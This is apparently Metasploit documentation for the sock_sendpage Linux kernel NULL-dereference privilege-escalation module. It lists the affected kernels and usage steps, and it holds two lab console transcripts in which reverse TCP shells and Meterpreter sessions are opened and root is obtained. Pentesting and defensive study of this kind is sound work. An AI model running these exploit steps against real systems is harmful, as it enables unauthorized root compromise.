## Description

  The Linux kernel failed to properly initialize some entries in the
  `proto_ops` struct for several protocols, leading to `NULL` being
  dereferenced and used as a function pointer. By using `mmap(2)` to map
  page `0`, an attacker can execute arbitrary code in the context of the
  kernel.


## Vulnerable Application

  Several public exploits exist for this vulnerability, including
  spender's `wunderbar_emporium` and rcvalle's ppc port, `sock_sendpage.c`.

  All Linux 2.4/2.6 versions since May 2001 are believed to be affected:

  * 2.4.4 up to and including 2.4.37.4
  * 2.6.0 up to and including 2.6.30.4

  This module has been tested successfully on:

  * CentOS 5.0 (i386) with kernel version 2.6.18-8.1.1.tl5
  * Debian 3.1r8 Sarge (i686) with kernel version 2.4.27-3-386


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. `use exploit/linux/local/sock_sendpage`
  4. `set SESSION [SESSION]`
  5. `check`
  6. `run`
  7. You should get a new *root* session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **WritableDir**

  A writable directory file system path. (default: `/tmp`)

  **DEBUG_EXPLOIT**

  Enable exploit debug messages. (default: `false`)


## Scenarios

  ### CentOS 5.0 (i386) with kernel version 2.6.18-8.1.1.tl5

  ```
  msf > use exploit/linux/local/sock_sendpage 
  msf exploit(linux/local/sock_sendpage) > set session 1
  session => 1
  msf exploit(linux/local/sock_sendpage) > set verbose true
  verbose => true
  msf exploit(linux/local/sock_sendpage) > set payload linux/x86/meterpreter/reverse_tcp
  payload => linux/x86/meterpreter/reverse_tcp
  msf exploit(linux/local/sock_sendpage) > run

  [!] SESSION may not be compatible with this module.
  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [+] Kernel version 2.6.18 appears to be vulnerable
  [+] System architecture i686 is supported
  [+] vm.mmap_min_addr is not set
  [*] Writing '/tmp/.MCpzrCREnMXU' (3509 bytes) ...
  [*] Max line length is 65537
  [*] Writing 3509 bytes in 1 chunks of 10560 bytes (octal-encoded), using printf
  [*] Executing payload...
  [*] Transmitting intermediate stager...(106 bytes)
  [*] Sending stage (857352 bytes) to 172.16.191.159
  [*] Meterpreter session 34 opened (172.16.191.188:4444 -> 172.16.191.159:37663) at 2018-04-10 06:50:13 -0400

  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : 172.16.191.159
  OS           : CentOS 5 (Linux 2.6.18-8.1.1.tl5)
  Architecture : i686
  BuildTuple   : i486-linux-musl
  Meterpreter  : x86/linux
  ```

  ### Debian 3.1r8 Sarge (i686) with kernel version 2.4.27-3-386

  ```
  msf > use exploit/linux/local/sock_sendpage 
  msf exploit(linux/local/sock_sendpage) > set payload linux/x86/shell/reverse_tcp
  payload => linux/x86/shell/reverse_tcp
  msf exploit(linux/local/sock_sendpage) > set session 1
  session => 1
  msf exploit(linux/local/sock_sendpage) > run

  [!] SESSION may not be compatible with this module.
  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [+] Kernel version 2.4.27 appears to be vulnerable
  [+] System architecture i686 is supported
  [+] vm.mmap_min_addr is not set
  [*] Writing '/tmp/.69p3FeagB' (3509 bytes) ...
  [*] Max line length is 65537
  [*] Writing 3509 bytes in 1 chunks of 10560 bytes (octal-encoded), using printf
  [*] Executing payload...
  [*] Sending stage (36 bytes) to 172.16.191.227
  [*] Command shell session 35 opened (172.16.191.188:4444 -> 172.16.191.227:32836) at 2018-04-10 06:59:08 -0400
  [!] Tried to delete /tmp/.69p3FeagB, unknown result

  3356110123
  lfvaliLFShnAfRQkCHUXFtuyGXKylJSN
  TJloQpOJsrsnQSfZpNAjWcbqNuHanLeI
  LeKIAUjwBMRhxjJjVvvrdvwErYZnxPYr
  id
  uid=0(root) gid=0(root) groups=100(users)
  uname -a
  Linux sarge 2.4.27-3-386 #1 Wed Dec 6 00:38:33 UTC 2006 i686 GNU/Linux
  ```

